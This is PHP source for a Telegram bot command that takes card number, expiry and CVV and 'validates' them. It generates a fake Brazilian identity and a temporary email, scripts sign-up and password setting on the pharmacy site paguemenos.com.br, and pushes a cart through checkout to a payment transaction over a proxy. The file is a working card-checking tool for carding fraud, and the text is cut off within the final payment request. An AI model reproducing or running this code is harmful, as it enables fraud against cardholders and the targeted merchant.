<?php
error_reporting(0);
ini_set('display_errors', 0);
include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";

if(strpos($message, '!sx') === 0 or strpos($message, '/sx') === 0 or strpos($message, '.sx') === 0)
{
// function getStrss($string, $start, $end) {
//  $str = explode($start, $string);
//  $str = explode($end, $str[1]);  
//  return $str[0];
// }

// function multiexplode($string) {
//  $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<", " ");
//  $one = str_replace($delimiters, $delimiters[0], $string);
//  $two = explode($delimiters[0], $one);
//  return $two;
// }
    
$flag = 'getFlags';
$lista = substr($message, 4);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$list = preg_replace('/\s/', '|', $lista);
$vaut = array(1,2,7,8,9,0);

    $delay = microtimeFormat($starttime);
    $result = urlencode("<b>••• 🟥ESPERE VALIDANDO...
••• 💳 CC ➜  $lista
••• ⌛Time ➜  $delay Segs
••• 👨🏻Checked by UserId➜  $userId
••• 🧑🏻‍💻Bot by ➜  @Z_tJKkeZQoZlcssuXjVjNerQ</b>");
        $su = reply_to($chat_id,$message_id,$keyboard,$result);
        $respon = json_decode($su, TRUE);
        $message_id_1 = $respon['result']['message_id'];

if (in_array($chem, $vaut)) { 
    reply_to($chat_id, $message_id,$keyboard,$validauth); exit();
} 

if (empty($lista)){
    reply_to($chat_id, $message_id,$keyboard,$validauth); exit();
}elseif($check<15){
    reply_to($chat_id, $message_id,$keyboard,$validauth); exit();
}elseif(strlen($strlenn != 16)){
    reply_to($chat_id, $message_id,$keyboard,$validauth); exit();
}
if(strlen($strlen1 > 2)) {
    $ano = $cvv; 
    $cvv = $mes;
    $mes = $ano1;
}

switch($ano){
case 2030: $ano = "30"; break;
case 2031: $ano = "31"; break;
case 2021: $ano = "21"; break;
case 2022: $ano = "22"; break;
case 2023: $ano = "23"; break;
case 2024: $ano = "24"; break;
case 2025: $ano = "25"; break;
case 2026: $ano = "26"; break;
case 2027: $ano = "27"; break;
case 2028: $ano = "28"; break;
case 2029: $ano = "29"; break;
}

///gerar dados
switch($mes){
case 1: $mes = "01"; break;
case 2: $mes = "02"; break;
case 3: $mes = "03"; break;
case 4: $mes = "04"; break;
case 5: $mes = "05"; break;
case 6: $mes = "06"; break;
case 7: $mes = "07"; break;
case 8: $mes = "08"; break;
case 9: $mes = "09"; break;
}

// include("consultarbin.php");
//==================[BIN LOOK-UP]======================//
$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);
// ==================[BIN LOOK-UP-END]======================//
$resultbin = "$brand $bank $type $country";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.4devs.com.br/ferramentas_online.php');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: */*',
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, "acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=");
$dat = curl_exec($ch);
$email = getStrss ($dat, 'email":"', '@');
$nome = getStrss ($dat, 'nome":"', '"');
$cpf = getStrss ($dat, 'cpf":"', '"');
$senha = getStrss ($dat, 'senha":"', '"');
$nome1 = multiexplode2 ($nome)[0];
$sobrenome = multiexplode2 ($nome)[1];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.invertexto.com/gerador-email-temporario');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./invertexto.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36'));
$data1 = curl_exec($ch);

$token = getStrss($data1, "token=","',");
$emailcobasi = getStrss($data1, 'id="email-input" value="','" readonly>');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paguemenos.com.br/api/vtexid/pub/authentication/startlogin');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: multipart/form-data; boundary=----WebKitFormBoundaryNyfmJblYGft9AEcs',
'vtex-id-ui-version: vtex.login@2.55.0/vtex.react-vtexid@4.52.0',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
'sec-ch-ua-platform: "Windows"',
'origin: https://www.paguemenos.com.br',
'referer: https://www.paguemenos.com.br/login?returnUrl=%2F'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryNyfmJblYGft9AEcs
Content-Disposition: form-data; name="accountName"

paguemenos
------WebKitFormBoundaryNyfmJblYGft9AEcs
Content-Disposition: form-data; name="scope"

paguemenos
------WebKitFormBoundaryNyfmJblYGft9AEcs
Content-Disposition: form-data; name="returnUrl"

https://www.paguemenos.com.br/
------WebKitFormBoundaryNyfmJblYGft9AEcs
Content-Disposition: form-data; name="callbackUrl"

https://www.paguemenos.com.br/api/vtexid/oauth/finish?popup=false
------WebKitFormBoundaryNyfmJblYGft9AEcs
Content-Disposition: form-data; name="user"

'.$emailcobasi.'
------WebKitFormBoundaryNyfmJblYGft9AEcs
Content-Disposition: form-data; name="fingerprint"


------WebKitFormBoundaryNyfmJblYGft9AEcs--');
$data1 = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paguemenos.com.br/api/vtexid/pub/authentication/accesskey/send');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: multipart/form-data; boundary=----WebKitFormBoundarytD3gfaMauvdgjoTY',
'vtex-id-ui-version: vtex.login@2.55.0/vtex.react-vtexid@4.52.0',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
'origin: https://www.paguemenos.com.br',
'referer: https://www.paguemenos.com.br/login?returnUrl=%2F'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundarytD3gfaMauvdgjoTY
Content-Disposition: form-data; name="email"

'.$emailcobasi.'
------WebKitFormBoundarytD3gfaMauvdgjoTY
Content-Disposition: form-data; name="locale"

pt-BR
------WebKitFormBoundarytD3gfaMauvdgjoTY
Content-Disposition: form-data; name="recaptcha"


------WebKitFormBoundarytD3gfaMauvdgjoTY--');
$data1 = curl_exec($ch);

sleep(3);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://uorak.com/tempmail.php?token='.$token.'');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./invertexto.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./invertexto.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: application/json, text/javascript, */*; q=0.01',
'Host: uorak.com',
'Origin: https://www.invertexto.com',
'Referer: https://www.invertexto.com/',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36'));
$data1 = curl_exec($ch);

$codigo = getStrss($data1, '\u00e9 ','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paguemenos.com.br/api/vtexid/pub/authentication/classic/setpassword?expireSessions=true');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: multipart/form-data; boundary=----WebKitFormBoundaryiXckaGwd3NYg7Qsf',
'vtex-id-ui-version: vtex.login@2.55.0/vtex.react-vtexid@4.52.0',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
'sec-ch-ua-platform: "Windows"',
'origin: https://www.paguemenos.com.br',
'referer: https://www.paguemenos.com.br/login?returnUrl=%2F'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryiXckaGwd3NYg7Qsf
Content-Disposition: form-data; name="login"

'.$emailcobasi.'
------WebKitFormBoundaryiXckaGwd3NYg7Qsf
Content-Disposition: form-data; name="newPassword"

Coritiba123!111
------WebKitFormBoundaryiXckaGwd3NYg7Qsf
Content-Disposition: form-data; name="currentPassword"


------WebKitFormBoundaryiXckaGwd3NYg7Qsf
Content-Disposition: form-data; name="accesskey"

'.$codigo.'
------WebKitFormBoundaryiXckaGwd3NYg7Qsf
Content-Disposition: form-data; name="recaptcha"


------WebKitFormBoundaryiXckaGwd3NYg7Qsf--');
$data1 = curl_exec($ch);

$emailcobasi;
$fdsss = getStrss($data1, '"userId":"','"');
$userId = str_replace("-", "", $fdsss);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paguemenos.com.br/api/checkout/pub/orderForm');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
'referer: https://www.paguemenos.com.br/hidratante%20labial%20nivea%20amora%20shine%204%2c8g?_q=Hidratante%20Labial%20Nivea%20Amora%20Shine%204,8g&map=ft'));
$data1 = curl_exec($ch);

$orderFormId = getStrss($data1, '"orderFormId":"','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paguemenos.com.br/_v/private/graphql/v1?workspace=master&maxAge=long&appsEtag=remove&domain=store&locale=pt-BR&__bindingId=23424e23-86bb-4397-98b0-238d88d7f528');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/json',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
'origin: https://www.paguemenos.com.br',
'referer: https://www.paguemenos.com.br/hidratante%20labial%20nivea%20amora%20shine%204%2c8g?_q=Hidratante%20Labial%20Nivea%20Amora%20Shine%204,8g&map=ft'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"operationName":"addToCart","variables":{},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"68d73608692d2549b50e697da4b346de15e6c237f2027d5d417ed9036a76e38e","sender":"vtex.checkout-resources@0.x","provider":"vtex.checkout-graphql@0.x"},"variables":"eyJpdGVtcyI6W3siaWQiOjQ0MzYxLCJxdWFudGl0eSI6MSwic2VsbGVyIjoiMSJ9XX0="}}');
$data1 = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paguemenos.com.br/api/checkout/pub/orderForm/'.$orderFormId.'/attachments/clientProfileData');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
'content-type: application/json; charset=UTF-8',
'accept: application/json, text/javascript, */*; q=0.01',
'x-requested-with: XMLHttpRequest',
'sec-ch-ua-platform: "Windows"',
'origin: https://www.paguemenos.com.br',
'referer: https://www.paguemenos.com.br/checkout/'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"firstEmail":"'.$emailcobasi.'","email":"'.$emailcobasi.'","firstName":"'.$nome1.'","lastName":"'.$sobrenome.'","document":"'.$cpf.'","phone":"+55 41 9848 7347","documentType":"cpf","isCorporate":false,"corporateName":null,"tradeName":null,"corporateDocument":null,"stateInscription":null,"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}');
$data1 = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paguemenos.com.br/api/checkout/pub/orderForm/'.$orderFormId.'/attachments/clientPreferencesData');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
'content-type: application/json; charset=UTF-8',
'accept: application/json, text/javascript, */*; q=0.01',
'x-requested-with: XMLHttpRequest',
'sec-ch-ua-platform: "Windows"',
'origin: https://www.paguemenos.com.br',
'referer: https://www.paguemenos.com.br/checkout/'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"locale":"pt-BR","optinNewsLetter":false,"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}');
$data1 = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paguemenos.com.br/api/checkout/pub/orderForm/'.$orderFormId.'/attachments/shippingData');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
'content-type: application/json; charset=UTF-8',
'accept: application/json, text/javascript, */*; q=0.01',
'x-requested-with: XMLHttpRequest',
'sec-ch-ua-platform: "Windows"',
'origin: https://www.paguemenos.com.br',
'referer: https://www.paguemenos.com.br/checkout/'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"logisticsInfo":[{"addressId":null,"itemIndex":0,"selectedDeliveryChannel":null,"selectedSla":null}],"clearAddressIfPostalCodeNotFound":false,"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}');
$data1 = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paguemenos.com.br/api/checkout/pub/orderForm/'.$orderFormId.'/attachments/shippingData');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
'content-type: application/json; charset=UTF-8',
'accept: application/json, text/javascript, */*; q=0.01',
'x-requested-with: XMLHttpRequest',
'sec-ch-ua-platform: "Windows"',
'origin: https://www.paguemenos.com.br',
'referer: https://www.paguemenos.com.br/checkout/'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"address":{"postalCode":"60025-001","country":"BRA"},"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}');
$data1 = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paguemenos.com.br/api/checkout/pub/orderForm/'.$orderFormId.'/attachments/paymentData');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
'content-type: application/json; charset=UTF-8',
'accept: application/json, text/javascript, */*; q=0.01',
'x-requested-with: XMLHttpRequest',
'sec-ch-ua-platform: "Windows"',
'origin: https://www.paguemenos.com.br',
'referer: https://www.paguemenos.com.br/checkout/'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payments":[{"paymentSystem":201,"paymentSystemName":"Dinheiro","group":"custom201PaymentGroupPaymentGroup","installments":1,"installmentsInterestRate":0,"installmentsValue":1649,"value":1649,"referenceValue":1649}],"giftCards":[],"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}');
$data1 = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paguemenos.com.br/api/checkout/pub/orderForm/'.$orderFormId.'/attachments/shippingData');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
'content-type: application/json; charset=UTF-8',
'accept: application/json, text/javascript, */*; q=0.01',
'x-requested-with: XMLHttpRequest',
'sec-ch-ua-platform: "Windows"',
'origin: https://www.paguemenos.com.br',
'referer: https://www.paguemenos.com.br/checkout/'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"logisticsInfo":[{"addressId":"a393e2dd1d6a470b995da7a7360c93e3","itemIndex":0,"selectedDeliveryChannel":"delivery","selectedSla":"Giga Entrega"}],"clearAddressIfPostalCodeNotFound":false,"selectedAddresses":[{"addressId":"a393e2dd1d6a470b995da7a7360c93e3","addressType":"residential","city":"Fortaleza","complement":null,"country":"BRA","geoCoordinates":[-38.53327178955078,-3.738957405090332],"neighborhood":"José Bonifácio","number":"514","postalCode":"60025-001","receiverName":"VINY GODZIN","reference":null,"state":"CE","street":"Rua Senador Pompeu","addressQuery":"","isDisposable":true},{"addressId":"3336262606170","addressType":"search","city":"Fortaleza","complement":null,"country":"BRA","geoCoordinates":[-38.53327178955078,-3.738957405090332],"neighborhood":"José Bonifácio","number":null,"postalCode":"60025-001","receiverName":"VINY GODZIN","reference":null,"state":"CE","street":"Rua Senador Pompeu","addressQuery":"","isDisposable":null}],"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}');
$data1 = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paguemenos.com.br/api/checkout/pub/orderForm/'.$orderFormId.'/attachments/paymentData');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
'content-type: application/json; charset=UTF-8',
'accept: application/json, text/javascript, */*; q=0.01',
'x-requested-with: XMLHttpRequest',
'sec-ch-ua-platform: "Windows"',
'origin: https://www.paguemenos.com.br',
'referer: https://www.paguemenos.com.br/checkout/'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payments":[{"hasDefaultBillingAddress":true,"installmentsInterestRate":0,"referenceValue":1649,"bin":null,"accountId":null,"value":1649,"tokenId":null,"paymentSystem":"2","installments":1}],"giftCards":[],"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}');
$data1 = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paguemenos.com.br/api/checkout/pub/orderForm/'.$orderFormId.'/transaction');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
'content-type: application/json; charset=UTF-8',
'accept: application/json, text/javascript, */*; q=0.01',
'x-requested-with: XMLHttpRequest',
'sec-ch-ua-platform: "Windows"',
'origin: https://www.paguemenos.com.br',
'referer: https://www.paguemenos.com.br/checkout/'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"referenceId":"'.$orderFormId.'","savePersonalData":true,"optinNewsLetter":false,"value":1649,"referenceValue":1649,"interestValue":0,"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}');
$data1 = curl_exec($ch);

$id = getStrss($data1, '"id":"','"');
$orderId = getStrss($data1, '"orderGroup":"','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://paguemenos.vtexpayments.com.br/api/pub/transactions/'.$id.'/payments?orderId='.$orderId.'&userProfileId='.$fdsss.'&redirect=false&callbackUrl=https%3A%2F%2Fwww.paguemenos.com.br%2Fcheckout%2FgatewayCallback%2F1275386378459%2F%7BmessageCode%7D&macId=969f2695-6224-45ef-b75a-d8cffab778d2&sessionId=4997e2d7-ed53-40c5-a4b7-69f3beba28db&deviceInfo=c3c9MTkyMCZzaD0xMDgwJmNkPTI0JnR6PTE4MCZsYW5nPXB0LUJSJmphdmE9ZmFsc2Umc291cmNlQXBwbGljYXRpb249dmNzLmNoZWNrb3V0LXVpQHY2LjcwLjExJmluc3RhbGxlZEFwcGxpY2F0aW9ucz1bInBpeC1wYXltZW50Il0=');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxy");
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./paguemenos.txt');
